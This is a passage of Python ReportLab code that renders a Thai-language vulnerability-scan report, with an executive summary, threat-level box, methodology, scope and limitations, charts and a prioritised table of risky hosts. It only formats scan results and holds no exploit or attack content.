                           ("TOPPADDING", (0, 0), (-1, -1), 7), ("BOTTOMPADDING", (0, 0), (-1, -1), 7),
                           ("LEFTPADDING", (0, 0), (-1, -1), 10)]))
    story.append(t)
    story.append(PageBreak())

    # ═══ 2. EXECUTIVE SUMMARY ═══
    story.append(H1("บทสรุปผู้บริหาร"))

    # ── ระดับภัยคุกคามองค์กร (org-level threat: worst single host = org level) ──
    _org_lvl = s.get("risk_level", "unknown")
    _org_lvl_th = {"critical": "CRITICAL — วิกฤต", "warning": "WARNING — ต้องเฝ้าระวัง",
                   "unknown":  "UNKNOWN — ยังไม่ทราบ", "safe": "SAFE — ปลอดภัย"}
    _org_bg   = {"critical": "#c0392b", "warning": "#d35400",
                 "unknown":  "#5a6475", "safe":    "#1e7e34"}
    _org_sub  = {"critical": "ต้องดำเนินการทันที — แม้เพียงเครื่องเดียวที่มีช่องโหว่ระดับวิกฤต องค์กรก็ถือว่าอยู่ในภาวะเสี่ยงสูง",
                 "warning":  "ต้องตรวจสอบเพิ่มเติม — พบสัญญาณเสี่ยงที่ต้องยืนยันและแก้ไขโดยเร็ว",
                 "unknown":  "ต้องตรวจสอบบนเซิร์ฟเวอร์จริง — ข้อมูลจากภายนอกไม่เพียงพอสรุปแน่ชัด",
                 "safe":     "ไม่พบช่องโหว่ที่ยืนยันได้ในการสแกนครั้งนี้"}
    _action_days = {"critical": "ภายใน 7 วัน (ด่วนที่สุด)", "warning": "ภายใน 15–30 วัน",
                    "unknown": "ภายใน 30 วัน (ตรวจยืนยัน)", "safe": "ทบทวนรายไตรมาส"}
    _olvl_bg = colors.HexColor(_org_bg.get(_org_lvl, "#5a6475"))
    if multi:
        _max_cvss_all = max((h.get("max_cvss") or 0 for h in data["hosts"] if h.get("reachable")), default=0.0)
        _has_assessed_cvss = (_max_cvss_all > 0) or (s.get("hosts_safe", 0) > 0 and s.get("hosts_unknown", 0) == 0)
        _cvss_all_str = f"{_max_cvss_all:.1f}" if _has_assessed_cvss else "—"
        _action_needed = s["hosts_vulnerable"] + s["hosts_warning"]
        _threat_detail = (
            f'พบ <b>{s["hosts_vulnerable"]} เครื่อง</b> ที่ยืนยันแล้วว่ามีช่องโหว่ (ต้องแก้ด่วน)  ·  '
            f'<b>{s["hosts_warning"]} เครื่อง</b> พบสัญญาณเสี่ยง (ต้องตรวจยืนยัน)  ·  '
            f'CVSS สูงสุด <b>{_cvss_all_str}</b>  ·  '
            f'กำหนดแก้ไข: <b>{_action_days.get(_org_lvl, "—")}</b>')
    else:
        _max_cvss_all = max((_cvss(r) for r in data["all_results"]
                             if _bucket_of(r.get("status")) in ("vulnerable", "warning")), default=0.0)
        _has_assessed_cvss = (_max_cvss_all > 0) or (s.get("safe", 0) > 0 and s.get("unknown", 0) == 0)
        _cvss_all_str = f"{_max_cvss_all:.1f}" if _has_assessed_cvss else "—"
        _action_needed = s["vulnerable"] + s["warning"]
        _threat_detail = (
            f'ยืนยันมีช่องโหว่ <b>{s["vulnerable"]}</b> รายการ  ·  '
            f'พบสัญญาณเสี่ยง <b>{s["warning"]}</b> รายการ  ·  '
            f'CVSS สูงสุด <b>{_cvss_all_str}</b>  ·  '
            f'กำหนดแก้ไข: <b>{_action_days.get(_org_lvl, "—")}</b>')
    _tlvl_st  = st("TL", fontSize=22, leading=28, textColor=colors.white, alignment=TA_CENTER)
    _tsub_st  = st("TS", fontSize=10,  leading=14, textColor=colors.HexColor("#fde8e8" if _org_lvl == "critical" else "#f0f4ff"), alignment=TA_CENTER)
    _tdet_st  = st("TD", fontSize=9.5, leading=13, textColor=colors.white, alignment=TA_CENTER)
    threat_box = Table([
        [P(f"ระดับภัยคุกคามองค์กร: {_org_lvl_th.get(_org_lvl, _org_lvl.upper())}", _tlvl_st)],
        [P(_org_sub.get(_org_lvl, ""), _tsub_st)],
        [Spacer(1, 0.1 * cm)],
        [P(_threat_detail, _tdet_st)],
    ], colWidths=[17 * cm])
    threat_box.setStyle(TableStyle([
        ("BACKGROUND",    (0, 0), (-1, -1), _olvl_bg),
        ("TOPPADDING",    (0, 0), (-1, -1), 10),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 10),
        ("LEFTPADDING",   (0, 0), (-1, -1), 14),
        ("RIGHTPADDING",  (0, 0), (-1, -1), 14),
    ]))
    story.append(threat_box)
    story.append(Spacer(1, 0.3 * cm))

    # RCE confirmation box (if applicable)
    ev = data.get("evidence_summary")
    if ev and ev.get("verdict"):
        confirmed = "CONFIRMED" in str(ev["verdict"]).upper()
        ebox = st("EB", fontSize=11, leading=15, textColor=colors.white)
        label = ("ยืนยันการโจมตีได้จริง (RCE CONFIRMED) — มีหลักฐานเก็บไว้ (chain-of-custody)"
                 if confirmed else f"ผลการพิสูจน์: {ev['verdict']}")
        box = Table([[P(label, ebox)]], colWidths=[16 * cm])
        box.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, -1),
                                  colors.HexColor("#b02a37" if confirmed else "#6b7280")),
                                 ("TOPPADDING", (0, 0), (-1, -1), 8), ("BOTTOMPADDING", (0, 0), (-1, -1), 8),
                                 ("LEFTPADDING", (0, 0), (-1, -1), 10)]))
        story.append(box)
        if ev.get("proof"):
            story.append(P(f"หลักฐาน (ย่อ): {ev['proof']}", st("evp", fontSize=8, leading=11,
                           fontName="Courier", textColor=GREY, spaceBefore=2)))
        story.append(Spacer(1, 0.2 * cm))

    if multi:
        story.append(P(
            f'การสแกน <b>{data["target"]}</b> ครอบคลุม <b>{s["hosts_total"]}</b> โดเมน/เซิร์ฟเวอร์ '
            f'(เชื่อมต่อได้ <b>{s["hosts_reachable"]}</b> เครื่อง). '
            f'พบเซิร์ฟเวอร์ที่ <b>ยืนยันว่ามีช่องโหว่ {s["hosts_vulnerable"]}</b> เครื่อง · '
            f'<b>พบสัญญาณเสี่ยง {s["hosts_warning"]}</b> เครื่อง · '
            f'<b>สรุปไม่ได้จากภายนอก {s["hosts_unknown"]}</b> เครื่อง · '
            f'<b>ปลอดภัย {s["hosts_safe"]}</b> เครื่อง. '
            f'(ดัชนีความเสี่ยงรวม: {s["risk_score"]}/100)', body))
        if s["hosts_unknown"] > (s["hosts_vulnerable"] + s["hosts_warning"]):
            story.append(Spacer(1, 0.12 * cm))
            story.append(P("📌 หมายเหตุ: เซิร์ฟเวอร์ส่วนใหญ่ 'ซ่อน' หมายเลขเวอร์ชัน — เป็นการตั้งค่าที่ดี "
                           "แต่ทำให้สแกนจากภายนอกสรุปไม่ได้ 100% ควรให้ผู้ดูแลระบบตรวจยืนยันบนเซิร์ฟเวอร์จริงด้วย",
                           st("interp", fontSize=9.5, leading=13, textColor=colors.HexColor("#8a6d00"))))
    else:
        story.append(P(
            f'การตรวจสอบ <b>{data["target"]}</b> ใช้รายการทดสอบทั้งหมด <b>{s["total"]}</b> รายการ '
            f'(เกี่ยวข้องกับซอฟต์แวร์บนเครื่อง <b>{s.get("applicable", s["total"])}</b> รายการ) — '
            f'<b>ตรวจพบช่องโหว่/ความเสี่ยงจริง {s.get("detected", s["vulnerable"] + s["warning"])} รายการ</b> '
            f'(ยืนยันมีช่องโหว่ <b>{s["vulnerable"]}</b> · พบสัญญาณเสี่ยง <b>{s["warning"]}</b> · '
            f'สรุปไม่ได้จากภายนอก <b>{s["unknown"]}</b> · ปลอดภัย/ไม่เกี่ยวข้อง <b>{s["safe"]}</b> รายการ). '
            f'(ดัชนีความเสี่ยงรวม: {s["risk_score"]}/100)', body))
    story.append(Spacer(1, 0.3 * cm))

    # ── KPI cards (6 cards) ──
    if multi:
        _cvss_disp = _cvss_all_str
        _pct_risk = f"{round(100*s['hosts_vulnerable']/max(s['hosts_reachable'],1))}%"
        cards = [
            ("เครื่องวิกฤต",    s["hosts_vulnerable"],   PALETTE["vuln"]),
            ("เครื่องอาจเสี่ยง", s["hosts_warning"],      PALETTE["warn"]),
            ("ต้องดำเนินการ",   _action_needed,           "#c0392b"),
            ("CVSS สูงสุด",      _cvss_disp,              "#922b21" if _max_cvss_all > 0 else PALETTE["safe"]),
            ("เข้าถึงได้",      s["hosts_reachable"],     PALETTE["nginx"]),
            ("เข้าไม่ถึง",      s["hosts_unreachable"],  PALETTE["unknown"]),
        ]
    else:
        cards = [("ยืนยันมีช่องโหว่", s["vulnerable"], PALETTE["vuln"]),
                 ("พบสัญญาณเสี่ยง", s["warning"], PALETTE["warn"]),
                 ("ต้องดำเนินการ", _action_needed, "#c0392b"),
                 ("CVSS สูงสุด", _cvss_all_str, "#922b21" if _max_cvss_all > 0 else PALETTE["safe"]),
                 ("ยังสรุปไม่ได้", s["unknown"], PALETTE["unknown"]),
                 ("ปลอดภัย", s["safe"], PALETTE["safe"])]
    _ncards = len(cards)
    cn = lambda col: st("CN", fontSize=18, leading=22, alignment=TA_CENTER, textColor=colors.HexColor(col))
    cl = st("CL", fontSize=8, leading=11, alignment=TA_CENTER, textColor=GREY)
    row_num = [P(f"<b>{val}</b>", cn(col)) for _, val, col in cards]
    row_lbl = [P(lbl, cl) for lbl, _, _ in cards]
    cw = 17 * cm / _ncards
    card_table = Table([row_num, row_lbl], colWidths=[cw] * _ncards)
    cs = [("ALIGN", (0, 0), (-1, -1), "CENTER"), ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
          ("BACKGROUND", (0, 0), (-1, -1), colors.HexColor("#fbfbfd")),
          ("BOX", (0, 0), (-1, -1), 0.6, colors.HexColor("#e3e6ef")),
          ("INNERGRID", (0, 0), (-1, -1), 0.6, colors.HexColor("#e3e6ef")),
          ("TOPPADDING", (0, 0), (-1, 0), 9), ("BOTTOMPADDING", (0, 1), (-1, 1), 9)]
    for i, (_, _, col) in enumerate(cards):
        cs.append(("LINEABOVE", (i, 0), (i, 0), 3.5, colors.HexColor(col)))
    card_table.setStyle(TableStyle(cs))
    story.append(card_table)
    story.append(Spacer(1, 0.25 * cm))
    story.append(P('CVSS (0–10) = ความรุนแรงของช่องโหว่ตามมาตรฐานสากล: '
                   '<b>9.0+ = วิกฤต · 7.0–8.9 = สูง · 4.0–6.9 = กลาง · ต่ำกว่า 4 = น้อย</b>. '
                   'ดัชนีความเสี่ยงรวมคำนวณจากจำนวนช่องโหว่ถ่วงน้ำหนักด้วยความรุนแรงและความแน่นอน '
                   '(ยืนยันแล้ว=เต็ม · พบสัญญาณ=ครึ่ง · ยังสรุปไม่ได้=เล็กน้อย). '
                   '<b>ระดับภัยคุกคามองค์กรกำหนดจากโฮสต์ที่เสี่ยงสูงสุด — แม้เพียงเครื่องเดียว</b>', note))
    story.append(Spacer(1, 0.5 * cm))
    story.append(PageBreak())

    # ═══ 2. METHODOLOGY & SCOPE ═══
    story.append(H1("ระเบียบวิธีและขอบเขตการตรวจสอบ"))
    story.append(P("ส่วนนี้อธิบายว่าการตรวจสอบครั้งนี้ทำกับอะไร ด้วยวิธีใด และผลลัพธ์ควรถูกตีความอย่างไร "
                   "เพื่อให้ผู้บริหารและผู้ปฏิบัติงานเข้าใจขอบเขตและข้อจำกัดของรายงานตรงกัน", body))
    story.append(Spacer(1, 0.3 * cm))

    story.append(P("2.1 ขอบเขตการตรวจสอบ (Scope)", h2))
    _ndistinct = len(set((r.get("cve") or "?") for r in data.get("all_results", [])))
    scope_tbl = [
        ["เป้าหมาย (Target)", data["target"]],
        ["ประเภทการสแกน", scope],
        ["วันที่ตรวจสอบ", data["scan_date"][:19].replace("T", " ")],
        ["จำนวนเป้าหมาย", f"{s['hosts_total']} รายการ (เข้าถึงได้ {s['hosts_reachable']} · เข้าไม่ถึง {s['hosts_unreachable']})"],
        ["หัวข้อช่องโหว่ที่ตรวจ", f"{_ndistinct} หัวข้อ CVE ครอบคลุมเทคโนโลยี PHP · NGINX · Node.js · GitLab"],
        ["เครื่องมือที่ใช้", f"RMUT CERT Security Audit Toolkit v{VERSION}"],
    ]
    _mt = Table([[P(a, cellb), P(b, cell)] for a, b in scope_tbl], colWidths=[5 * cm, 11 * cm])
    _mt.setStyle(TableStyle([("BACKGROUND", (0, 0), (0, -1), RMUT_LIGHT), ("TEXTCOLOR", (0, 0), (0, -1), RMUT_BLUE),
                             ("LINEBELOW", (0, 0), (-1, -1), 0.4, colors.HexColor("#d6d9e6")),
                             ("TOPPADDING", (0, 0), (-1, -1), 6), ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
                             ("LEFTPADDING", (0, 0), (-1, -1), 10)]))
    story.append(_mt)
    story.append(Spacer(1, 0.35 * cm))

    story.append(P("2.2 วิธีการตรวจสอบ (Methodology)", h2))
    story.append(P("• <b>ตรวจจากภายนอกแบบไม่รบกวนระบบ (External, non-intrusive)</b> — ระบุชนิดและเวอร์ชันของเว็บเซิร์ฟเวอร์/ภาษา "
                   "แล้วเทียบกับฐานข้อมูลช่องโหว่ที่ทราบ โดยไม่กระทบการให้บริการ", body))
    story.append(P("• <b>ยืนยันช่องโหว่ (RCE Verification) เมื่อจำเป็น</b> — ทดสอบพิสูจน์แบบปลอดภัย พร้อมเก็บหลักฐานตามหลัก chain-of-custody", body))
    story.append(P("• <b>ตรวจการตั้งค่าพื้นฐาน</b> — Security Headers, คุกกี้ความปลอดภัย และใบรับรอง TLS", body))
    story.append(Spacer(1, 0.3 * cm))

    story.append(P("2.3 เกณฑ์การประเมินความเสี่ยง", h2))
    story.append(P("ใช้มาตรฐานสากล <b>CVSS v3.1 (0.0–10.0)</b> ถ่วงน้ำหนักด้วยความแน่นอนของสถานะ "
                   "(ยืนยันเสี่ยง = เต็ม · พบสัญญาณ = ครึ่ง · ยังสรุปไม่ได้/ปลอดภัย = ไม่นับ) แล้วแปลงเป็นดัชนี 0–100. "
                   "<b>ระดับภัยคุกคามระดับองค์กรกำหนดจากโฮสต์ที่เสี่ยงสูงสุด — แม้เพียงเครื่องเดียวก็ถือว่าทั้งองค์กรเสี่ยง</b>", body))
    story.append(Spacer(1, 0.3 * cm))

    story.append(P("2.4 หน่วยการนับผลลัพธ์ (สำคัญต่อการอ่านตัวเลข)", h2))
    story.append(P("รายงานนี้นับผลลัพธ์ <b>2 หน่วย</b> และตัวเลขในทุกไฟล์ (PDF / HTML / Excel / CSV) อ้างอิงชุดข้อมูลเดียวกัน:", body))
    story.append(P("• <b>รายเครื่อง (โฮสต์)</b> — จัดระดับความเสี่ยงของแต่ละเครื่อง ผลรวมเท่ากับจำนวนโฮสต์ทั้งหมด", body))
    story.append(P("• <b>รายหัวข้อ CVE (รายการตรวจ)</b> — หนึ่งเครื่องตรวจหลายหัวข้อ ตัวเลขจึงมากกว่าจำนวนเครื่องเสมอ", body))
    story.append(Spacer(1, 0.3 * cm))

    story.append(P("2.5 ข้อจำกัดของการตรวจสอบ (Limitations)", h2))
    story.append(P("• ตรวจจากภายนอกเท่านั้น — ช่องโหว่ที่ต้องยืนยันการตั้งค่าภายในเครื่องจะถูกจัดเป็น 'ยังไม่ทราบ' จนกว่าจะตรวจบนเครื่องจริง", body))
    story.append(P("• เซิร์ฟเวอร์ที่ซ่อนหมายเลขเวอร์ชันจะตรวจจากภายนอกไม่ได้ (ถือเป็นการตั้งค่าที่ดีด้านความปลอดภัย)", body))
    story.append(P("• ผลลัพธ์เป็นภาพ ณ เวลาที่สแกน ควรสแกนซ้ำเป็นระยะและหลังการแก้ไขทุกครั้ง", body))
    story.append(Spacer(1, 0.5 * cm))
    story.append(PageBreak())

    # ═══ 3. DASHBOARD ═══
    story.append(H1("ผลการตรวจโดยรวม"))
    if s["total"] == 0 and s["hosts_reachable"] == 0:
        warnbox = st("WB", fontSize=11, leading=16, textColor=colors.HexColor("#8a6d00"))
        nb = Table([[P("ไม่พบโฮสต์ที่เข้าถึงได้จากการสแกนนี้ จึงไม่มีข้อมูลช่องโหว่ให้แสดงกราฟ<br/>"
                       "ตรวจสอบว่าเป้าหมายออนไลน์และเปิดพอร์ต 80/443 หรือระบุ subdomain ที่ถูกต้อง", warnbox)]],
                    colWidths=[16 * cm])
        nb.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, -1), colors.HexColor("#fff8e1")),
                                ("BOX", (0, 0), (-1, -1), 0.6, colors.HexColor("#ffe0a3")),
                                ("TOPPADDING", (0, 0), (-1, -1), 12), ("BOTTOMPADDING", (0, 0), (-1, -1), 12),
                                ("LEFTPADDING", (0, 0), (-1, -1), 12)]))
        story.append(nb)
        if charts.get("hosts") and os.path.exists(charts["hosts"]):
            story.append(Spacer(1, 0.4 * cm))
            story.append(Image(charts["hosts"], width=13 * cm, height=7.4 * cm))
    else:
        # กราฟวงกลม: สัดส่วนโฮสต์เสี่ยงเทียบกับโฮสต์ทั้งหมด (แสดงเสมอในโหมดหลายโฮสต์)
        if multi:
            for fl in native_pie(
                [("เสี่ยงสูง", s["hosts_vulnerable"], PALETTE["vuln"]),
                 ("อาจเสี่ยง", s["hosts_warning"], PALETTE["warn"]),
                 ("ยังไม่ทราบ", s["hosts_unknown"], PALETTE["unknown"]),
                 ("ปลอดภัย", s["hosts_safe"], PALETTE["safe"]),
                 ("เข้าไม่ถึง", s["hosts_unreachable"], "#c7ccd6")],
                    title=f"ภาพรวมโฮสต์ตามระดับความเสี่ยง · นับรายเครื่อง (ทั้งหมด {s['hosts_total']} โฮสต์)"):
                story.append(fl)
            story.append(Spacer(1, 0.4 * cm))

        # กราฟวงกลม: เจอช่องโหว่ไหนบ้าง นับตาม CVE (เฉพาะรายการที่เข้าข่ายเสี่ยง)
        from collections import Counter as _Counter
        _sevcol = {"Critical": SEV_PALETTE["Critical"], "High": SEV_PALETTE["High"],
                   "Medium-High": SEV_PALETTE["Medium-High"], "Medium": SEV_PALETTE["Medium"],
                   "Low": SEV_PALETTE["Low"], "Info": SEV_PALETTE["Info"]}
        cve_ct, cve_col = _Counter(), {}
        for r in data["all_results"]:
            if _bucket_of(r.get("status")) != "safe":
                cid = r.get("cve", "?")
                cve_ct[cid] += 1
                cve_col[cid] = _sevcol.get(r.get("severity", "").split("(")[0].strip(), PALETTE["unknown"])
        if cve_ct:
            top = cve_ct.most_common(8)
            items = [(cid, n, cve_col.get(cid, PALETTE["unknown"])) for cid, n in top]
            other = sum(n for _, n in cve_ct.most_common()[8:])
            if other:
                items.append(("CVE อื่น ๆ", other, PALETTE["other"]))
            for fl in native_pie(items, title="ช่องโหว่ที่พบ แยกตามหมายเลข CVE (นับจำนวนครั้งที่เข้าข่ายเสี่ยง)", center_label="ครั้ง", distinct=True):
                story.append(fl)
            story.append(P("นับเฉพาะรายการสถานะ เสี่ยง/อาจเสี่ยง/ยังสรุปไม่ได้ (ไม่รวมที่ปลอดภัย) — "
                           "ตัวเลข = จำนวนครั้งที่พบรวมทุกโฮสต์",
                           st("pien", fontSize=8, leading=11, textColor=GREY, spaceBefore=2)))
            story.append(Spacer(1, 0.4 * cm))

        have_png = any(os.path.exists(charts.get(k, "")) for k in charts) if charts else False
        if have_png:
            story.append(P("ภาพรวมเชิงสถิติของผลการตรวจสอบ อ่านจากบนลงล่าง ซ้ายไปขวา", note))
            story.append(Spacer(1, 0.25 * cm))

            def chart_cell(key, caption):
                if key in charts and os.path.exists(charts[key]):
                    img = Image(charts[key], width=7.6 * cm, height=5.7 * cm)
                    cap = P(caption, st("cap", fontSize=8, leading=11, textColor=GREY, alignment=TA_CENTER))
                    inner = Table([[img], [cap]], colWidths=[7.8 * cm])
                    inner.setStyle(TableStyle([("ALIGN", (0, 0), (-1, -1), "CENTER"),
                                               ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
                                               ("TOPPADDING", (0, 1), (-1, 1), 2)]))
                    return inner
                return P("")

            top_left = "hosts" if multi and charts.get("hosts") else "severity"
            cap_left = ("อ่านกราฟ: นับจำนวนโฮสต์ตามระดับความเสี่ยง และโฮสต์ที่เข้าไม่ถึง"
                        if top_left == "hosts" else
                        "อ่านกราฟ: จำนวนรายการในแต่ละระดับความรุนแรง — โฟกัสสีแดง (Critical) ก่อน")
            grid_rows = [
                [chart_cell(top_left, cap_left),
                 chart_cell("status", "อ่านกราฟ: จำนวนรายการช่องโหว่ในแต่ละสถานะ — แท่งแดงคือยืนยันแล้วว่าเสี่ยง")],
                [chart_cell("severity" if top_left == "hosts" else "category",
                            "อ่านกราฟ: สัดส่วนรายการตามระดับความรุนแรง" if top_left == "hosts"
                            else "อ่านกราฟ: สัดส่วนช่องโหว่แยกตามเทคโนโลยี PHP / NGINX"),
                 chart_cell("stacked", "อ่านกราฟ: ในแต่ละเทคโนโลยี มีสัดส่วนสถานะอย่างไร สีแดงมาก = เสี่ยงมาก")],
            ]
            grid = Table(grid_rows, colWidths=[8 * cm, 8 * cm])
            grid.setStyle(TableStyle([("ALIGN", (0, 0), (-1, -1), "CENTER"), ("VALIGN", (0, 0), (-1, -1), "TOP"),
                                      ("BOTTOMPADDING", (0, 0), (-1, -1), 10)]))
            story.append(grid)
            extra = "tophosts" if (multi and charts.get("tophosts")) else "toprisk"
            if charts.get(extra) and os.path.exists(charts[extra]):
                story.append(Spacer(1, 0.2 * cm))
                story.append(Image(charts[extra], width=15 * cm, height=7 * cm))
                story.append(P(("อ่านกราฟ: โฮสต์ที่คะแนนความเสี่ยงสูงสุด ควรจัดการก่อน" if extra == "tophosts"
                                else "อ่านกราฟ: ยิ่งแท่งยาว ยิ่งควรจัดการก่อน (ความรุนแรง × ความแน่นอน)"),
                               st("cap2", fontSize=8, leading=11, textColor=GREY, alignment=TA_CENTER)))
        else:
            # ── ไม่มี matplotlib → วาดสถิติด้วย ReportLab เอง (รายงานไม่มีวันว่าง) ──
            story.append(P("ภาพรวมเชิงสถิติของผลการตรวจสอบ (เรนเดอร์ในตัว ไม่ต้องใช้ไลบรารีภายนอก)", note))
            story.append(Spacer(1, 0.3 * cm))
            if multi:
                for fl in native_bars(
                    [("เสี่ยงสูง", s["hosts_vulnerable"], PALETTE["vuln"]),
                     ("อาจเสี่ยง", s["hosts_warning"], PALETTE["warn"]),
                     ("ยังไม่ทราบ", s["hosts_unknown"], PALETTE["unknown"]),
                     ("ปลอดภัย", s["hosts_safe"], PALETTE["safe"]),
                     ("เข้าไม่ถึง", s["hosts_unreachable"], "#c7ccd6")],
                        title=f"ภาพรวมโฮสต์ · นับรายเครื่อง (ทั้งหมด {s['hosts_total']})"):
                    story.append(fl)
                story.append(Spacer(1, 0.35 * cm))
            _sev_imp = s.get("by_severity_impact") or s["by_severity"]
            for fl in native_bars(
                [("Critical", _sev_imp["Critical"], SEV_PALETTE["Critical"]),
                 ("High", _sev_imp["High"], SEV_PALETTE["High"]),
                 ("Medium", _sev_imp["Medium"], SEV_PALETTE["Medium"]),
                 ("Low", _sev_imp["Low"], SEV_PALETTE["Low"]),
                 ("Info", _sev_imp["Info"], SEV_PALETTE["Info"])],
                    title="จำนวนรายการที่ตรวจพบจริงตามระดับความรุนแรง"):
                story.append(fl)
            story.append(Spacer(1, 0.35 * cm))
            for fl in native_bars(
                [("ยืนยันเสี่ยง", s["vulnerable"], PALETTE["vuln"]),
                 ("อาจเสี่ยง", s["warning"], PALETTE["warn"]),
                 ("ยังไม่ทราบ", s["unknown"], PALETTE["unknown"]),
                 ("ปลอดภัย", s["safe"], PALETTE["safe"])],
                    title="ภาพรวมรายการตรวจ CVE ตามสถานะ · นับรายหัวข้อ"):
                story.append(fl)
            story.append(P("หมายเหตุ: ติดตั้ง matplotlib (pip install matplotlib) เพื่อให้ได้กราฟวงกลม/เกจรูปแบบสมบูรณ์",
                           st("mplnote", fontSize=8, leading=11, textColor=GREY, spaceBefore=6)))

        # ── สถิติการกระจายของระบบ (แสดงเสมอ) ──
        from collections import Counter
        reach = [h for h in data["hosts"] if h.get("reachable")]
        fam, ver = Counter(), Counter()
        hidden = 0
        for h in reach:
            srv = (h.get("server") or "?").strip()
            fam[srv.split()[0] if srv else "?"] += 1
            if len(srv.split()) >= 2:
                ver[srv] += 1
            else:
                hidden += 1
        if reach:
            story.append(Spacer(1, 0.45 * cm))
            story.append(P("การกระจายของเว็บเซิร์ฟเวอร์ (เฉพาะโฮสต์ที่เข้าถึงได้)", h2))
            fam_colors = {"NGINX": PALETTE["nginx"], "LiteSpeed": PALETTE["php"],
                          "Apache": PALETTE["warn"], "IIS": PALETTE["ink2"], "?": PALETTE["unknown"]}
            for fl in native_bars([(k, v, fam_colors.get(k, PALETTE["other"]))
                                   for k, v in fam.most_common(6)], title=None):
                story.append(fl)
            if ver:
                story.append(Spacer(1, 0.3 * cm))
                story.append(P("เวอร์ชันที่ตรวจพบมากที่สุด (Top versions)", h2))
                for fl in native_bars([(k, v, PALETTE["ink2"]) for k, v in ver.most_common(6)], title=None):
                    story.append(fl)
            story.append(P(f"โฮสต์ที่ซ่อนเวอร์ชัน (ตรวจจากภายนอกไม่ได้): <b>{hidden}</b> จาก {len(reach)} โฮสต์ "
                           f"— เป็นการตั้งค่าที่ดีด้านความปลอดภัย แต่ทำให้ผลเป็น 'ยังสรุปไม่ได้' ต้องยืนยันบนเครื่องจริง",
                           st("hid", fontSize=9, leading=13, textColor=GREY, spaceBefore=6)))
    story.append(PageBreak())


    # Top risky items/hosts
    if multi:
        # เรียงตาม "ความแน่นอน" ก่อน (ยืนยันเสี่ยง > อาจเสี่ยง > ไม่ทราบ) แล้วค่อยคะแนน/CVSS
        risky_hosts = sorted([h for h in data["hosts"] if h.get("reachable") and h["risk_score"] > 0],
                             key=lambda h: (_RISK_ORDER.get(h["risk_level"], 9),
                                            -h["max_cvss"], -h["risk_score"]))
        if risky_hosts:
            story.append(P(f"โฮสต์ที่ต้องดำเนินการก่อน ({len(risky_hosts)} โฮสต์)", h2))
            story.append(P("รายการด้านล่างเรียงจากความเสี่ยงสูงสุดไปต่ำสุด — "
                           "ควรแก้ไขหรือตรวจสอบตามลำดับหมายเลข "
                           "คอลัมน์ [เสี่ยง] = ยืนยันแล้ว · [ต้องตรวจ] = พบสัญญาณแต่ยังต้องยืนยันบนเครื่อง",
                           note))
            story.append(Spacer(1, 0.1 * cm))
            # Compact table — แสดงทุกโฮสต์ ไม่ตัดทิ้ง
            try:
                pdfmetrics.getFont(font + "-Bold")
                _bold_font = font + "-Bold"
            except Exception:
                _bold_font = font
            _pri_hd  = st("priH",  fontSize=8, leading=11, textColor=colors.white,
                          fontName=_bold_font, alignment=1)   # 1 = CENTER
            _pri_c   = st("priC",  fontSize=8, leading=11)
            _pri_red = st("priRed", fontSize=8, leading=11, textColor=colors.HexColor("#c0392b"), fontName=_bold_font, alignment=1)
            _pri_orn = st("priOrn", fontSize=8, leading=11, textColor=colors.HexColor("#d35400"), fontName=_bold_font, alignment=1)
            SHOW_MAX = len(risky_hosts)  # แสดงทั้งหมด
            show_h = risky_hosts
            # Dynamic column widths — กำหนด fixed ทุกคอลัมน์ยกเว้น "โฮสต์" ให้รับพื้นที่ที่เหลือ
            _PAGE_W = 18.0 * cm  # พื้นที่ใช้ได้ = A4(21cm) - margin(1.5+1.5)
            _c_num  = 1.1  * cm  # #  (รองรับ 3+ หลัก ยืดหยุ่น)
            _c_srv  = 2.3  * cm  # เซิร์ฟเวอร์
            _c_cvss = 1.3  * cm  # CVSS
            _c_idx  = 1.9  * cm  # ดัชนีความเสี่ยง (2 บรรทัด: "ดัชนี" / "ความเสี่ยง")
            _c_vuln = 2.3  * cm  # เสี่ยง (ยืนยันแล้ว)
            _c_warn = 3.05 * cm  # ต้องตรวจสอบ (พบสัญญาณ)
            _c_host = _PAGE_W - _c_num - _c_srv - _c_cvss - _c_idx - _c_vuln - _c_warn
            _col_w = [_c_num, _c_host, _c_srv, _c_cvss, _c_idx, _c_vuln, _c_warn]
            pri_rows = [[P("#", _pri_hd), P("โฮสต์", _pri_hd), P("เซิร์ฟเวอร์", _pri_hd),
                         P("CVSS", _pri_hd), P("ดัชนี\nความเสี่ยง", _pri_hd),
                         P("เสี่ยง\n(ยืนยันแล้ว)", _pri_hd), P("ต้องตรวจสอบ\n(พบสัญญาณ)", _pri_hd)]]
            _pri_c_ctr = st("priCC", fontSize=8, leading=11, alignment=1)          # center for numbers
            for i, h in enumerate(show_h, 1):
                cc = h["counts"]
                pri_rows.append([
                    P(str(i), _pri_c_ctr),
                    P(h["host"], _pri_c),
                    P((h["server"] or "?").split()[0], _pri_c_ctr),
                    P(f"{h['max_cvss']:.1f}" if h["max_cvss"] else "—", _pri_red if h["max_cvss"] >= 9.0 else _pri_c_ctr),
                    P(str(h["risk_score"]), _pri_c_ctr),
                    P(str(cc["vulnerable"]) if cc["vulnerable"] else "—",
                      _pri_red if cc["vulnerable"] else _pri_c_ctr),
                    P(str(cc["warning"]) if cc["warning"] else "—",
                      _pri_orn if cc["warning"] else _pri_c_ctr),
                ])
            pri_t = Table(pri_rows, colWidths=_col_w, repeatRows=1)
            pri_t.setStyle(TableStyle([
                ("BACKGROUND",    (0, 0), (-1, 0),   RMUT_BLUE),
                ("TEXTCOLOR",     (0, 0), (-1, 0),   colors.white),
                # header: กึ่งกลางทั้งแนวนอนและแนวตั้ง
                ("ALIGN",         (0, 0), (-1, 0),   "CENTER"),
                ("VALIGN",        (0, 0), (-1, 0),   "MIDDLE"),
                # data rows: # และคอลัมน์ตัวเลขกึ่งกลาง, โฮสต์ชิดซ้าย
                ("ALIGN",         (0, 1), (0, -1),   "CENTER"),   # # col
                ("ALIGN",         (2, 1), (-1, -1),  "CENTER"),   # Server / CVSS / Risk / Vuln / Warn
                ("VALIGN",        (0, 1), (-1, -1),  "MIDDLE"),
                ("ROWBACKGROUNDS",(0, 1), (-1, -1), [colors.white, colors.HexColor("#f4f6fb")]),
                ("LINEBELOW",     (0, 0), (-1, -1),  0.3, colors.HexColor("#d9dce6")),
                ("TOPPADDING",    (0, 0), (-1, -1),  4),
                ("BOTTOMPADDING", (0, 0), (-1, -1),  4),
                ("LEFTPADDING",   (0, 0), (-1, -1),  5),
